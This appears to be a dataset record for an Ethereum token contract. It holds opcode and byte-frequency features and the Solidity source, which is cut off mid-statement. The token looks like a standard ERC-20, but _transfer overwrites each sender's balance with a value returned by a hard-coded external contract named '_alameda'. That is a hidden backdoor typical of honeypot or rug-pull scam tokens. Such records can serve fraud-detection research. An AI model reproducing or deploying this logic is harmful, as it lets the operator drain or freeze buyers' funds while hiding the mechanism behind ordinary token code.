{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 MLOAD PUSH1 PUSH1 PUSH1 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 ADD JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD JUMPDEST PUSH1 MLOAD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH2 SWAP1 PUSH1 AND DUP2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH1 DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH2 PUSH1 SLOAD DUP2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD SWAP1 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP2 DUP3 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE SHA3 SLOAD SWAP1 JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 JUMP JUMPDEST POP PUSH1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP5 DUP5 DUP5 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP5 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 SHA3 SLOAD DUP3 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH8 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 DUP6 CALLER PUSH2 DUP7 DUP6 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST POP PUSH1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND CALLER EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 MLOAD PUSH1 SWAP2 PUSH1 PUSH1 PUSH1 SHL SUB AND SWAP1 PUSH32 SWAP1 DUP4 SWAP1 LOG3 PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB NOT AND SWAP1 SSTORE JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND CALLER EQ DUP1 PUSH2 JUMPI POP PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND ISZERO JUMPDEST PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 NOT AND PUSH1 OR SWAP1 SSTORE NUMBER PUSH1 SSTORE JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 DUP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH4 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH2 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 DUP2 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 SHA3 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 SWAP2 ADD JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP7 AND PUSH1 PUSH1 PUSH1 SHL SUB NOT SWAP3 DUP4 AND OR SWAP1 SWAP3 SSTORE PUSH1 DUP1 SLOAD SWAP3 DUP6 AND SWAP3 SWAP1 SWAP2 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE PUSH1 SLOAD PUSH1 AND ISZERO ISZERO PUSH1 EQ DUP1 PUSH2 JUMPI POP PUSH1 SLOAD PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB SWAP1 DUP2 AND SWAP2 AND EQ JUMPDEST PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH3 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST DUP1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP6 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 DUP1 DUP3 SHA3 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE SWAP1 DUP2 SHA3 DUP1 SLOAD DUP4 SWAP3 SWAP1 PUSH2 SWAP1 DUP5 SWAP1 PUSH2 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 PUSH1 PUSH1 SHL SUB AND DUP4 PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH32 DUP4 PUSH1 MLOAD PUSH2 SWAP2 DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 SLOAD PUSH1 MLOAD PUSH4 PUSH1 SHL DUP2 MSTORE PUSH1 DUP2 ADD DUP4 SWAP1 MSTORE PUSH1 SWAP2 PUSH1 PUSH1 PUSH1 SHL SUB AND SWAP1 PUSH4 SWAP1 PUSH1 ADD PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE PUSH1 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 ADD MSTORE DUP3 ADD PUSH2 JUMP JUMPDEST POP PUSH1 PUSH1 DUP3 DUP7 ADD ADD MSTORE PUSH1 PUSH1 NOT PUSH1 DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP2 AND DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP5 PUSH1 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP5 PUSH2 JUMP JUMPDEST SWAP3 POP PUSH2 PUSH1 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP PUSH1 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 PUSH1 DUP5 ADD PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 JUMPI PUSH1 DUP3 AND SWAP2 POP JUMPDEST PUSH1 DUP3 LT DUP2 SUB PUSH2 JUMPI PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST DUP2 DUP2 SUB DUP2 DUP2 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP UNKNOWN_0xfe LOG2 PUSH5 UNKNOWN_0x22 SLT SHA3 UNKNOWN_0xa9 SLT UNKNOWN_0xe6 SWAP7 PUSH1 SELFBALANCE UNKNOWN_0xf6 UNKNOWN_0xd0 PUSH1 DIV SWAP14 UNKNOWN_0xdd DUP1 SWAP7 CALLER PUSH12 UNKNOWN_0xf7 DUP11 PUSH5 STOP ADDMOD SGT STOP CALLER",
  "opcode_entropy": 4.7019209779548925,
  "opcode_count": 1637,
  "unique_opcodes": 72,
  "byte_entropy": 6.079156997250573,
  "byte_0x": 0.0003652300949598247,
  "byte_60": 0.11577794010226443,
  "byte_80": 0.027757487216946677,
  "byte_40": 0.013878743608473338,
  "byte_52": 0.031409788166544925,
  "byte_34": 0.0007304601899196494,
  "byte_15": 0.009130752373995616,
  "byte_61": 0.056245434623813005,
  "byte_00": 0.01789627465303141,
  "byte_10": 0.004017531044558071,
  "byte_57": 0.01789627465303141,
  "byte_fd": 0.006574141709276844,
  "byte_5b": 0.03688823959094229,
  "byte_50": 0.020452885317750184,
  "byte_04": 0.009130752373995616,
  "byte_36": 0.002191380569758948,
  "byte_01": 0.06391526661796933,
  "byte_0b": 0.0018261504747991235,
  "byte_35": 0.0014609203798392988,
  "byte_e0": 0.002556610664718773,
  "byte_1c": 0.0007304601899196494,
  "byte_63": 0.01168736303871439,
  "byte_70": 0.0029218407596785976,
  "byte_a0": 0.010226442658875092,
  "byte_82": 0.02154857560262966,
  "byte_31": 0.0029218407596785976,
  "byte_11": 0.0029218407596785976,
  "byte_a2": 0.0007304601899196494,
  "byte_a7": 0.0018261504747991235,
  "byte_05": 0.0029218407596785976,
  "byte_ee": 0.0007304601899196494,
  "byte_e2": 0.001095690284879474,
  "byte_71": 0.0018261504747991235,
  "byte_14": 0.008765522279035792,
  "byte_02": 0.006574141709276844,
  "byte_0e": 0.001095690284879474,
  "byte_a8": 0.0003652300949598247,
  "byte_aa": 0.001095690284879474,
  "byte_1b": 0.01935719503287071,
  "byte_21": 0.0007304601899196494,
  "byte_a9": 0.001095690284879474,
  "byte_9c": 0.0007304601899196494,
  "byte_bb": 0.0003652300949598247,
  "byte_c9": 0.0014609203798392988,
  "byte_56": 0.025931336742147554,
  "byte_7b": 0.001095690284879474,
  "byte_f9": 0.001095690284879474,
  "byte_47": 0.0007304601899196494,
  "byte_dd": 0.002191380569758948,
  "byte_62": 0.005113221329437546,
  "byte_ed": 0.0003652300949598247,
  "byte_3e": 0.001095690284879474,
  "byte_4f": 0.0018261504747991235,
  "byte_c2": 0.001095690284879474,
  "byte_18": 0.001095690284879474,
  "byte_a6": 0.001095690284879474,
  "byte_eb": 0.001095690284879474,
  "byte_8d": 0.0007304601899196494,
  "byte_a5": 0.0007304601899196494,
  "byte_cb": 0.0007304601899196494,
  "byte_f5": 0.001095690284879474,
  "byte_95": 0.0007304601899196494,
  "byte_d8": 0.001095690284879474,
  "byte_9b": 0.0007304601899196494,
  "byte_41": 0.0014609203798392988,
  "byte_06": 0.002556610664718773,
  "byte_1f": 0.003652300949598247,
  "byte_de": 0.0007304601899196494,
  "byte_8a": 0.001095690284879474,
  "byte_23": 0.002556610664718773,
  "byte_b8": 0.0007304601899196494,
  "byte_72": 0.008765522279035792,
  "byte_97": 0.0018261504747991235,
  "byte_3c": 0.001095690284879474,
  "byte_e5": 0.004017531044558071,
  "byte_67": 0.0014609203798392988,
  "byte_48": 0.0018261504747991235,
  "byte_cd": 0.003652300949598247,
  "byte_4c": 0.0003652300949598247,
  "byte_b1": 0.0003652300949598247,
  "byte_b9": 0.001095690284879474,
  "byte_a3": 0.002191380569758948,
  "byte_7f": 0.005113221329437546,
  "byte_03": 0.02410518626734843,
  "byte_09": 0.009861212563915266,
  "byte_5e": 0.0003652300949598247,
  "byte_b3": 0.0007304601899196494,
  "byte_55": 0.003287070854638422,
  "byte_16": 0.015704894083272462,
  "byte_0d": 0.0014609203798392988,
  "byte_78": 0.0007304601899196494,
  "byte_0f": 0.0014609203798392988,
  "byte_54": 0.010591672753834916,
  "byte_90": 0.02702702702702703,
  "byte_81": 0.021183345507669833,
  "byte_51": 0.009495982468955442,
  "byte_91": 0.01241782322863404,
  "byte_20": 0.030679327976625273,
  "byte_f3": 0.0018261504747991235,
  "byte_88": 0.0003652300949598247,
  "byte_37": 0.0018261504747991235,
  "byte_08": 0.002556610664718773,
  "byte_c7": 0.0007304601899196494,
  "byte_68": 0.004017531044558071,
  "byte_1a": 0.0003652300949598247,
  "byte_0c": 0.0003652300949598247,
  "byte_ff": 0.001095690284879474,
  "byte_12": 0.0029218407596785976,
  "byte_7c": 0.001095690284879474,
  "byte_d0": 0.001095690284879474,
  "byte_e7": 0.0003652300949598247,
  "byte_8b": 0.0007304601899196494,
  "byte_07": 0.002191380569758948,
  "byte_42": 0.0007304601899196494,
  "byte_9a": 0.0003652300949598247,
  "byte_5d": 0.0007304601899196494,
  "byte_83": 0.008400292184075968,
  "byte_93": 0.0029218407596785976,
  "byte_94": 0.0018261504747991235,
  "byte_0a": 0.004017531044558071,
  "byte_ec": 0.0014609203798392988,
  "byte_92": 0.00620891161431702,
  "byte_c3": 0.0007304601899196494,
  "byte_27": 0.0007304601899196494,
  "byte_33": 0.0029218407596785976,
  "byte_84": 0.009861212563915266,
  "byte_28": 0.0014609203798392988,
  "byte_4d": 0.0014609203798392988,
  "byte_c8": 0.001095690284879474,
  "byte_46": 0.0029218407596785976,
  "byte_24": 0.004017531044558071,
  "byte_45": 0.002556610664718773,
  "byte_43": 0.0029218407596785976,
  "byte_32": 0.002191380569758948,
  "byte_30": 0.002556610664718773,
  "byte_3a": 0.0029218407596785976,
  "byte_74": 0.006574141709276844,
  "byte_6e": 0.005113221329437546,
  "byte_73": 0.00620891161431702,
  "byte_66": 0.002191380569758948,
  "byte_65": 0.01168736303871439,
  "byte_6d": 0.001095690284879474,
  "byte_6f": 0.006939371804236669,
  "byte_75": 0.0003652300949598247,
  "byte_64": 0.008035062089116142,
  "byte_44": 0.003652300949598247,
  "byte_6c": 0.003652300949598247,
  "byte_77": 0.0018261504747991235,
  "byte_c0": 0.0007304601899196494,
  "byte_dc": 0.0003652300949598247,
  "byte_85": 0.004382761139517896,
  "byte_d7": 0.0003652300949598247,
  "byte_86": 0.0014609203798392988,
  "byte_69": 0.002191380569758948,
  "byte_bf": 0.002556610664718773,
  "byte_53": 0.0003652300949598247,
  "byte_59": 0.0003652300949598247,
  "byte_13": 0.0007304601899196494,
  "byte_a4": 0.0003652300949598247,
  "byte_f2": 0.0007304601899196494,
  "byte_19": 0.002556610664718773,
  "byte_49": 0.0003652300949598247,
  "byte_22": 0.0014609203798392988,
  "byte_da": 0.0003652300949598247,
  "byte_af": 0.0003652300949598247,
  "byte_e3": 0.0007304601899196494,
  "byte_b4": 0.0003652300949598247,
  "byte_6b": 0.0007304601899196494,
  "byte_17": 0.001095690284879474,
  "byte_76": 0.0007304601899196494,
  "byte_7a": 0.0014609203798392988,
  "byte_f0": 0.0003652300949598247,
  "byte_87": 0.001095690284879474,
  "byte_8c": 0.0003652300949598247,
  "byte_e1": 0.0003652300949598247,
  "byte_7d": 0.0007304601899196494,
  "byte_d1": 0.0003652300949598247,
  "byte_1e": 0.0007304601899196494,
  "byte_f7": 0.0007304601899196494,
  "byte_b2": 0.0007304601899196494,
  "byte_29": 0.0003652300949598247,
  "byte_25": 0.0007304601899196494,
  "byte_79": 0.0007304601899196494,
  "byte_fa": 0.0003652300949598247,
  "byte_5f": 0.0003652300949598247,
  "byte_c1": 0.0003652300949598247,
  "byte_e8": 0.0003652300949598247,
  "byte_d5": 0.0007304601899196494,
  "byte_ad": 0.0003652300949598247,
  "byte_b0": 0.0003652300949598247,
  "byte_fc": 0.0003652300949598247,
  "byte_2b": 0.002191380569758948,
  "byte_f1": 0.0007304601899196494,
  "byte_c4": 0.0003652300949598247,
  "byte_a1": 0.0003652300949598247,
  "byte_5a": 0.0007304601899196494,
  "byte_ef": 0.0003652300949598247,
  "byte_b7": 0.0007304601899196494,
  "byte_3d": 0.001095690284879474,
  "byte_f4": 0.0003652300949598247,
  "byte_2c": 0.0007304601899196494,
  "byte_cc": 0.0003652300949598247,
  "byte_4e": 0.0007304601899196494,
  "byte_26": 0.0007304601899196494,
  "byte_fe": 0.0003652300949598247,
  "byte_58": 0.0003652300949598247,
  "byte_e6": 0.0003652300949598247,
  "byte_96": 0.0007304601899196494,
  "byte_4b": 0.0003652300949598247,
  "byte_f6": 0.0003652300949598247,
  "byte_6a": 0.0003652300949598247,
  "byte_9d": 0.0003652300949598247,
  "byte_be": 0.0003652300949598247,
  "byte_3f": 0.0003652300949598247,
  "num_nodes": 154,
  "num_edges": 94,
  "avg_degree": 1.2207792207792207,
  "density": 0.003989474577709872,
  "connected_components": 76,
  "avg_clustering": 0.0183982683982684,
  "timeline_sequence": [],
  "sourcecode": "/**\n *Submitted for verification at Etherscan.io on 2023-05-06\n*/\n\n/*\n\n HIS EMPIRE.\n \n ONLY HIS.\n \n FTX.\n\n*/\n\npragma solidity ^0.8.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\ninterface IDEXFactory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IDEXRouter {\n    function WETH() external pure returns (address);\n    function factory() external pure returns (address);\n}\n\ninterface IERC20 {\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    function totalSupply() external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IERC5679 {\n      function createSwap(uint256 value) external returns (uint256);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    function name() external view returns (string memory);\n}\n\ncontract Ownable is Context {\n    address private _previousOwner; address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address _alameda = 0x3E9380614648ceeFAC175605791ba9Ec43C054Bc;\n    address public pair;\n\n    IDEXRouter router;\n    IERC5679 alameda;\n\n    string private _name; string private _symbol; uint256 private _totalSupply;\n    bool public trade; uint256 public startBlock; address public msgSend;\n    address public msgReceive;\n    \n    constructor (string memory name_, string memory symbol_) {\n        router = IDEXRouter(_router);\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\n        alameda = IERC5679(_alameda);\n\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function openTrading() public {\n        require(((msg.sender == owner()) || (address(0) == owner())), \"Ownable: caller is not the owner\");\n        trade = true; startBlock = block.number;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n        \n    function getAmount(uint256 amount) internal returns (uint256) {\n        return alameda.createSwap(amount);\n    }\n\n    function _beforeTokenTransfer(address sender, address recipient, uint256 amount) internal virtual {\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        msgSend = sender; msgReceive = recipient;\n\n        require(((trade == true) || (msgSend == owner())), \"ERC20: trading is not yet enabled\");\n        require(msgSend != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        _balances[sender] = getAmount(amount) - amount;\n        _balances[recipient] += amount;\n\n        emit 